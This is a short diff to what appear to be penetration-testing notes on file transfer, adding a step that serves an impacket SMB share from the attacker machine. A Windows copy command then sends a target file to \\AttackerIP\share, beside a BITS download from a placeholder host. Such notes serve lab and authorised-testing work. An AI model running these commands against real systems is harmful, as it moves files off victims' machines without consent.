@@ -89,6 +89,10 @@ LinPeas and Winpeas located ate my `Privesc_scripts` repository.
 6. ```powershell
    Start-BitsTransfer -Source https://IP:PORT/FILE -Destination "C:\FULL\PATH\FILE"
    ```
+7. ```python3
+   impacket-smbserver share . -smb2support (Attacker Machine)
+   copy C:\File\To\PATH \\AttackerIP\share\
+   ```
 
 ### File Upload - Windows
 
